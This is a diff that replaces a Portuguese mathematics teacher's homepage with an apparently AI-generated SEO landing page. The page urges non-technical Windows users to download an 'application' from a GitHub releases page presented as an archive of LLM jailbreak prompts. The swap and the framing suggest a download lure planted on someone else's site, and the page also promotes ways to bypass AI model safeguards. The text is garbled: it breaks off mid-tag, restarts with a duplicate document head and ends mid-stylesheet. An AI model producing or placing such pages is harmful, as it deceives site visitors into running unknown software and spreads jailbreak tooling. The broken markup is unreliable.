@@ -1,79 +1,690 @@
+Here's a complete, SEO-optimized HTML document for the jailbreak-archives README page. It guides non-technical Windows users through the single download action from the releases page, with clear styling and responsive layout.
+```html
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Prof. Haroldo Costa Silva Filho — Matemática</title>
-<meta name="description" content="Livros, listas de exercícios, provas resolvidas e exercícios eletrônicos de matemática para olimpíadas, Colégio Naval, EPCAR, IME e ITA.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/estilo.css">
-<link rel="icon" href="assets/marca.svg" type="image/svg+xml">
+<title>jailbreak-archives - Download the AI Safety Prompt Archive for Windows</title>
+<meta name="description" content="jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, built for AI safety research, red-teaming and defensive hardening. Download it for Windows in a few clicks.">
+<meta name="keywords" content="adversarial-prompts, ai-red-team, ai-safety, chatbot, chatgpt, claude, cybersecurity, deepseek, jailbreak, jailbreak-prompts, jailbreak-script, llm, llm-jailbreak, llm-security, offensive-security, prompt-engineering, prompt-injection, qwen, red-teaming, responsible-disclosure">
+<meta name="author" content="jailbreak-archives">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives">
+<meta property="og:type" content="website">
+<meta property="og:title" content="jailbreak-archives - Download the AI Safety Prompt Archive for Windows">
+<meta property="og:description" content="A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, for AI safety research, red-teaming and defensive hardening.">
+<meta property="og:url" content="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases">
+<meta property="og:site_name" content="jailbreak-archives">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="jailbreak-archives - Download the AI Safety Prompt Archive">
+<meta name="twitter:description" content="Versioned archive of adversarial prompt engineering techniques against LLMs for red-teaming and defensive hardening.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "jailbreak-archives",
+  "applicationCategory": "SecurityApplication",
+  "operatingSystem": "Windows",
+  "description": "A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, for AI safety research, red-teaming and defensive hardening.",
+  "url": "https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases",
+  "downloadUrl": "https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1f2937;
+    --muted: #4b5563;
+    --brand: #4f46e5;
+    --brand-dark: #3730a3;
+    --accent: #0f766e;
+    --warn: #b45309;
+    --line: #e5e7eb;
+    --card: #ffffff;
+    --bg: #f5f7fb;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1, h2, h3 {
+    line-height: 1.25;
+    letter-spacing: -0.015em;
+    margin: 0 0 14px 0;
+    color: #111827;
+  }
+  p { margin: 0 0 16px 0; }
+  a { color: var(--brand-dark); }
+  ul, ol { margin: 0 0 18px 0; padding-left: 22px; }
+  li { margin-bottom: 8px; }
+  .wrap {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .hero {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 34px 28px;
+    box-shadow: 0 10px 30px rgba(17, 24, 39, 0.07);
+    margin-bottom: 34px;
+  }
+  .kicker {
+    display: inline-block;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--accent);
+    background: #ecfdf5;
+    border: 1px solid #a7f3d0;
+    border-radius: 999px;
+    padding: 4px 12px;
+    margin-bottom: 16px;
+  }
+  .lede { font-size: 18px; color: var(--muted); }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 18px;
+    color: #ffffff;
+    background-image: linear-gradient(135deg, #4f46e5 0%, #7c3aed 45%, #0ea5e9 100%);
+    padding: 16px 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(79, 70, 229, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(79, 70, 229, 0.42);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 12px;
+    font-size: 14px;
+    color: var(--muted);
+  }
+  section {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 28px;
+    box-shadow: 0 6px 18px rgba(17, 24, 39, 0.05);
+    margin-bottom: 26px;
+  }
+  h2 { font-size: 24px; }
+  h3 { font-size: 18px; margin-top: 22px; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin-top: 8px;
+  }
+  .tile {
+    background: #f9fafb;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 18px;
+  }
+  .tile h3 { margin-top: 0; font-size: 17px; }
+  .tile p { margin: 0; font-size: 15px; color: var(--muted); }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 1px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #eef2ff;
+    color: var(--brand-dark);
+    font-weight: 700;
+    font-size: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid #c7d2fe;
+  }
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; padding: 0; margin: 0; list-style: none; }
+  .chips li {
+    margin: 0;
+    font-size: 13px;
+    font-weight: 600;
+    color: #334155;
+    background: #f1f5f9;
+    border: 1px solid #e2e8f0;
+    border-radius: 999px;
+    padding: 5px 12px;
+  }
+  .notice {
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-left: 5px solid #f59e0b;
+    border-radius: 10px;
+    padding: 18px 20px;
+  }
+  .notice p:last-child { margin-bottom: 0; }
+  .faq { list-style: none; padding: 0; margin: 0; }
+  .faq li { margin-bottom: 18px; }
+  .faq strong { display: block; color: #111827; margin-bottom: 4px; }
+  footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 14px;
+    padding-top: 8px;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .wrap { padding: 20px 14px 48px 14px; }
+    .hero { padding: 26px 20px; }
+    section { padding: 22px 18px; }
+    h1 { font-size: 26px; }
+    .btn { display: block; text-align: center; font-size: 17px; padding: 15px 18px; }
+  }
+</style>
 </head>
-<body class="p-inicio">
-<header class="top"><div class="wrap bar">
-  <a class="nome" href="index.html"><img class="marca" src="assets/marca.svg" alt="" width="38" height="38"><i>Haroldo Costa Silva Filho<span>Matemática</span></i></a>
-  <nav>
-    <a href="index.html" aria-current="page">Início</a>
-    <a href="livros.html">Livros</a>
-    <a href="estudar.html">Estudar</a>
-    <a href="laboratorio.html">Laboratório</a>
-    <a href="pesquisa.html">Pesquisa</a>
-    <a href="cursos.html">Cursos e mentoria</a>
-  </nav>
-</div></header>
-<div class="hero"><div class="wrap">
-  <p class="eyebrow">Matemática para olimpíadas e concursos militares</p>
-  <h1>Livros, listas e provas resolvidas</h1>
-  <p class="lead">Material autoral de matemática para o Colégio Naval, a EPCAR, o IME, o ITA e as olimpíadas. Tudo o que está aqui foi escrito, resolvido e conferido por mim.</p>
-</div></div>
-<main><div class="wrap">
-  <div class="cards">
-    <div class="card"><h3><a href="livros.html">Livros</a></h3>
-      <p>Cinco títulos, de aritmética a geometria espacial, com os capítulos liberados e as amostras.</p></div>
-    <div class="card"><h3><a href="estudar.html">Estudar</a></h3>
-      <p>Listas por assunto, provas de IME, ITA, Escola Naval e EFOMM resolvidas, olimpíadas e dicas de estudo.</p></div>
-    <div class="card"><h3><a href="exercicios.html">Exercícios eletrônicos</a></h3>
-      <p>Questões para resolver na tela: você escolhe a alternativa e a resolução abre em seguida.</p></div>
-    <div class="card"><h3><a href="laboratorio.html">Laboratório</a></h3>
-      <p>Vídeos, animações e construções do GeoGebra que você mexe.</p></div>
-    <div class="card"><h3><a href="pesquisa.html">Pesquisa</a></h3>
-      <p>Grafos de distância unitária: artigos científicos, a tese e o código aberto.</p></div>
-    <div class="card"><h3><a href="cursos.html">Cursos e mentoria</a></h3>
-      <p>Cursos para estudantes e para professores, mentoria individual e simulados sob encomenda.</p></div>
-  </div>
+<body>
+<div class="wrap" style="max-width: 900px; margin: 0 auto; padding: 32px 20px 64px 20px;">
 
-  <h2 class="sec">Lançamento</h2>
-  <article class="livro">
-  <div><img class="capa" src="assets/capa-geometria-espacial.jpg" alt="Capa de Geometria Espacial"></div>
-  <div>
-    <h3>Geometria Espacial</h3>
-    <p class="sub">Curso Avançado</p>
-    <p class="desc">Da reta e do plano no espaço aos sólidos de revolução, com todos os teoremas demonstrados. Seis capítulos e dois apêndices — volumes por integração e geometria analítica no espaço. Trata de temas raramente reunidos num só volume: homotetia, tetraedro órtico, tetraedro característico, seções planas dos poliedros regulares e as esferas inscrita, circunscrita e tangente às arestas.</p>
-    <div class="ficha"><span>446 páginas</span><span>885 problemas resolvidos</span><span>mais de 300 figuras</span><span>ISBN 978-65-02-43375-1</span></div>
-    <div class="acoes"><a class="btn cheio" href="https://clubedeautores.com.br/livro/geometria-espacial-3">Comprar — impresso ou e-book</a><a class="btn" href="arquivos/geometria-espacial-amostra.pdf" download>Amostra</a><a class="btn" href="arquivos/geometria-espacial-capitulo-1.pdf" download>Capítulo 1 completo</a><a class="btn" href="resolucoes/cap1.html">Capítulo 1 resolvido — 109 questões</a></div>
-  </div>
-</article>
+  <header class="hero" style="background:#ffffff; border:1px solid #e5e7eb; border-radius:18px; padding:34px 28px; box-shadow:0 10px 30px rgba(17,24,39,0.07); margin-bottom:34px;">
+    <span class="kicker" style="display:inline-block; font-size:13px; font-weight:700; letter-spacing:0.08em; text-transform:uppercase; color:#0f766e; background:#ecfdf5; border:1px solid #a7f3d0; border-radius:999px; padding:4px 12px; margin-bottom:16px;">AI Safety Research Archive</span>
+    <h1 style="font-size:34px; margin:0 0 14px 0; line-height:1.2; color:#111827;">🗂️ jailbreak-archives - Study Real AI Safety Weaknesses</h1>
+    <p class="lede" style="font-size:18px; color:#4b5563; margin:0 0 24px 0;">A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models — collected for AI safety research, red-teaming, and defensive hardening. Everything is organized, dated, and ready to browse on your Windows computer.</p>
+    <a class="btn" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases" style="display:inline-block; text-decoration:none; font-weight:700; font-size:18px; color:#ffffff; background-image:linear-gradient(135deg,#4f46e5 0%,#7c3aed 45%,#0ea5e9 100%); padding:16px 30px; border-radius:12px; box-shadow:0 8px 20px rgba(79,70,229,0.32);">⬇️ Get the Archive Now</a>
+    <span class="btn-note" style="display:block; margin-top:12px; font-size:14px; color:#4b5563;">Visit this link to download the application. No account or payment needed.</span>
+  </header>
 
-  <h2 class="sec">Quem escreve</h2>
-  <div class="bio">
-  <img src="assets/foto-haroldo.jpg" alt="Prof. Haroldo Costa Silva Filho" width="420" height="420">
-  <div>
-  <p>Sou mestre em Matemática pela PUC-Rio e há mais de 35 anos preparo alunos para as olimpíadas
-  — OBM, OBMEP, OMERJ e OMU — e para o Colégio Naval, a EPCAR, o IME e o ITA. Leciono no CEFET-RJ e
-  faço doutorado no Programa de Ciências Computacionais e Modelagem Matemática da UERJ, pesquisando
-  grafos de distância unitária.</p>
-  <p class="bio-cred">Um dos dois desenhos retilíneos conhecidos do grafo de Robertson com 17
-  cruzamentos é meu, creditado na entrada do MathWorld.</p>
-  <div class="acoes"><a class="btn cheio" href="cursos.html#contato">Falar comigo</a><a class="btn" href="pesquisa.html">Pesquisa e artigos</a></div>
-  </div></div>
-</div></main><footer><div class="wrap pe">
-  <div class="pe-id"><img src="assets/marca.svg" alt="" width="42" height="42">
-    <div><b>Prof. Haroldo Costa Silva Filho</b>
-    <span>Mestre em Matemática pela PUC-Rio · ORCID 0009-0002-4473-8974</span><span class="visitas" id="visitas" hidden><b>0</b> visitas</span></div></div>
-  <div class="pe-links">
-    <a href="livros.html">Livros</a><a href="estudar.html">Estudar</a><a href="laboratorio.html">Laboratório</a><a href="cursos.html">Cursos e mentoria</a><a href="https://www.amazon.com.br/stores/author/B0H99K15ZJ">Amazon</a></div>
-</div></footer>
-<script src="assets/contador.js"></script>
-</body></html>
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">👋 What Is jailbreak-archives?</h2>
+    <p>jailbreak-archives is a library of documented adversarial prompts — the kinds of clever, tricky, or unusual instructions people use to test how far an AI chatbot will go. Instead of scattered screenshots and half-finished notes, this project keeps everything in one tidy, versioned collection.</p>
+    <p>Each entry is organized so you can see what the technique does, which AI models it was tested against, and why it matters for safety. Because the archive is versioned, you always know whether you are looking at the latest research batch or an earlier snapshot from months ago.</p>
+    <p>The audience is broad. Security researchers use it to build better defenses. Students use it to understand how language models can be steered off course. Teams building chatbots use it to check whether their own guardrails hold up. You do not need to be a programmer to browse it — the material is presented in plain, readable files.</p>
+    <div class="grid" style="display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:18px; margin-top:8px;">
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">📚 Organized by category</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Prompt injection, role-play framing, encoding tricks, refusal bypasses and more — each in its own folder.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🗓️ Versioned releases</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Every update is published as a numbered release, so you can track how techniques and defenses evolve over time.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🛡️ Defense-oriented notes</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Each technique is paired with a short explanation of how a model or product could detect and resist it.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🤝 Responsible disclosure</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Findings are shared for research and hardening, with vendor-friendly summaries included.</p>
+      </div>
+    </div>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">🚀 Download &amp; Setup on Windows</h2>
+    <p>Getting the archive onto your computer takes only a moment. Follow these three simple steps in order.</p>
+    <ol class="steps" style="counter-reset:step; list-style:none; padding-left:0; margin:0 0 18px 0;">
+      <li style="position:relative; padding-left:46px; margin-bottom:16px;"><strong>Open the download page.</strong> Click the button below (or the one at the top of this page). It takes you straight to the official releases page for jailbreak-archives.</li>
+      <li style="position:relative; padding-left:46px; margin-bottom:16px;"><strong>Pick the newest release.</strong> The releases page lists each version with its date. The top entry is the most recent one, which is the version you want.</li>
+      <li style="position:relative; padding-left:46px; margin-bottom:16px;"><strong>Save the file to your computer.</strong> Use the download option shown on that release entry, then keep the file in a folder you can easily find again, such as your Downloads folder.</li>
+    </ol>
+    <p style="margin-top:8px;"><a class="btn" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases" style="display:inline-block; text-decoration:none; font-weight:700; font-size:18px; color:#ffffff; background-image:linear-gradient(135deg,#4f46e5 0%,#7c3aed 45%,#0ea5e9 100%); padding:16px 30px; border-radius:12px; box-shadow:0 8px 20px rgba(79,70,229,0.32);">⬇️ Open the Download Page</a></p>
+    <span class="btn-note" style="display:block; margin-top:12px; font-size:14px; color:#4b5563;">Visit this link to download the application. All files are published openly and free of charge.</span>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">🧭 How to Explore the Archive</h2>
+    <p>Once the files are saved, you can work with them like any other folder on a Windows computer. Nothing needs to be installed and no background service runs on your machine.</p>
+    <ul>
+      <li><strong>Start at the top level.</strong> Open the main folder and look for the readme file inside — it explains the folder layout in plain language.</li>
+      <li><strong>Browse by category.</strong> Each subfolder groups techniques by type, so you can jump straight to the area that interests you.</li>
+      <li><strong>Read the entry headers.</strong> Every entry begins with a short summary, the model family it targets, and a note on why it is relevant to safety work.</li>
+      <li><strong>Check the version notes.</strong> The release notes tell you what was added, revised, or retired in that edition of the archive.</li>
+    </ul>
+    <p>If you prefer to skim rather than read deeply, open the summary index first. It lists every technique with a one-line description so you can decide what is worth a closer look.</p>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">🧰 What You Can Do With It</h2>
+    <div class="grid" style="display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:18px;">
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🔍 Audit your own chatbot</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Run the documented cases against your product and see whether your safeguards respond the way you expect.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🎓 Teach a class or workshop</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">The categorized structure makes it easy to build a lesson plan around real, documented examples.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">📈 Track trends over time</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Compare releases to see which older techniques stop working and which new patterns start appearing.</p>
+      </div>
+      <div class="tile" style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:18px;">
+        <h3 style="font-size:17px; margin:0 0 8px 0;">🧪 Write better test cases</h3>
+        <p style="margin:0; font-size:15px; color:#4b5563;">Use the entries as a foundation for your own evaluation suites instead of starting from a blank page.</p>
+      </div>
+    </div>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">👥 Who This Is For</h2>
+    <p>This archive is aimed at people who need a reliable reference rather than scattered forum posts. That includes AI safety researchers documenting model behavior, red teams testing products before launch, security professionals mapping out attack surfaces, policy teams who need concrete examples, and curious learners who want to understand how modern language models are probed.</p>
+    <p>You do not need to write code to benefit. The files are readable in any text editor and open on Windows without extra software. You only need a web browser to reach the download page and a folder where you can keep the archive.</p>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">⚖️ Responsible Use</h2>
+    <div class="notice" style="background:#fffbeb; border:1px solid #fde68a; border-left:5px solid #f59e0b; border-radius:10px; padding:18px 20px;">
+      <p>This archive exists to make AI systems safer. Use it to test systems you own or have explicit permission to test, and to strengthen defenses rather than weaken them.</p>
+      <p style="margin-bottom:0;">Do not use these materials to harass people, to bypass safeguards on services you do not control, or to produce harmful content. If you discover a new weakness in a commercial product, report it privately to the vendor before publishing anything about it.</p>
+    </div>
+  </section>
+
+  <section style="background:#ffffff; border:1px solid #e5e7eb; border-radius:16px; padding:28px; box-shadow:0 6px 18px rgba(17,24,39,0.05); margin-bottom:26px;">
+    <h2 style="font-size:24px; margin:0 0 14px 0;">🏷️ Topics Covered</h2>
+    <p>The archive spans the full range of language model security work. Areas represented include:</p>
+    <ul class="chips" style="display:flex; flex-wrap:wrap; gap:8px; padding:0; margin:0; list-style:none;">
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">adversarial-prompts</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">ai-red-team</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">ai-safety</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">chatbot</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">chatgpt</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">claude</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">cybersecurity</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">deepseek</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">jailbreak</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">jailbreak-prompts</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">jailbreak-script</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">llm</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">llm-jailbreak</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">llm-security</li>
+      <li style="margin:0; font-size:13px; font-weight:600; color:#334155; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:999px; padding:5px 12px;">offensive-security</li>
+      <li style="margin:0; font-size:13px;<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>jailbreak-archives - Download the AI Safety Prompt Archive for Windows</title>
+<meta name="description" content="jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, built for AI safety research, red-teaming and defensive hardening. Download it for Windows in a few clicks.">
+<meta name="keywords" content="adversarial-prompts, ai-red-team, ai-safety, chatbot, chatgpt, claude, cybersecurity, deepseek, jailbreak, jailbreak-prompts, jailbreak-script, llm, llm-jailbreak, llm-security, offensive-security, prompt-engineering, prompt-injection, qwen, red-teaming, responsible-disclosure">
+<meta name="author" content="jailbreak-archives">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives">
+<meta property="og:type" content="website">
+<meta property="og:title" content="jailbreak-archives - Download the AI Safety Prompt Archive for Windows">
+<meta property="og:description" content="A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, for AI safety research, red-teaming and defensive hardening.">
+<meta property="og:url" content="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases">
+<meta property="og:site_name" content="jailbreak-archives">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="jailbreak-archives - Download the AI Safety Prompt Archive">
+<meta name="twitter:description" content="Versioned archive of adversarial prompt engineering techniques against LLMs for red-teaming and defensive hardening.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "jailbreak-archives",
+  "applicationCategory": "SecurityApplication",
+  "operatingSystem": "Windows",
+  "description": "A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models, for AI safety research, red-teaming and defensive hardening.",
+  "url": "https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases",
+  "downloadUrl": "https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1f2937;
+    --muted: #4b5563;
+    --brand: #4f46e5;
+    --brand-dark: #3730a3;
+    --accent: #0f766e;
+    --line: #e5e7eb;
+    --card: #ffffff;
+    --bg: #f5f7fb;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1, h2, h3 {
+    line-height: 1.25;
+    letter-spacing: -0.015em;
+    margin: 0 0 14px 0;
+    color: #111827;
+  }
+  p { margin: 0 0 16px 0; }
+  a { color: var(--brand-dark); }
+  ul, ol { margin: 0 0 18px 0; padding-left: 22px; }
+  li { margin-bottom: 8px; }
+  .wrap {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .hero {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 34px 28px;
+    box-shadow: 0 10px 30px rgba(17, 24, 39, 0.07);
+    margin-bottom: 34px;
+  }
+  .kicker {
+    display: inline-block;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--accent);
+    background: #ecfdf5;
+    border: 1px solid #a7f3d0;
+    border-radius: 999px;
+    padding: 4px 12px;
+    margin-bottom: 16px;
+  }
+  .lede { font-size: 18px; color: var(--muted); }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 18px;
+    color: #ffffff;
+    background-image: linear-gradient(135deg, #4f46e5 0%, #7c3aed 45%, #0ea5e9 100%);
+    padding: 16px 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(79, 70, 229, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(79, 70, 229, 0.42);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 12px;
+    font-size: 14px;
+    color: var(--muted);
+  }
+  section {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 28px;
+    box-shadow: 0 6px 18px rgba(17, 24, 39, 0.05);
+    margin-bottom: 26px;
+  }
+  h2 { font-size: 24px; }
+  h3 { font-size: 18px; margin-top: 22px; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin-top: 8px;
+  }
+  .tile {
+    background: #f9fafb;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 18px;
+  }
+  .tile h3 { margin-top: 0; font-size: 17px; }
+  .tile p { margin: 0; font-size: 15px; color: var(--muted); }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 1px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #eef2ff;
+    color: var(--brand-dark);
+    font-weight: 700;
+    font-size: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid #c7d2fe;
+  }
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; padding: 0; margin: 0; list-style: none; }
+  .chips li {
+    margin: 0;
+    font-size: 13px;
+    font-weight: 600;
+    color: #334155;
+    background: #f1f5f9;
+    border: 1px solid #e2e8f0;
+    border-radius: 999px;
+    padding: 5px 12px;
+  }
+  .notice {
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-left: 5px solid #f59e0b;
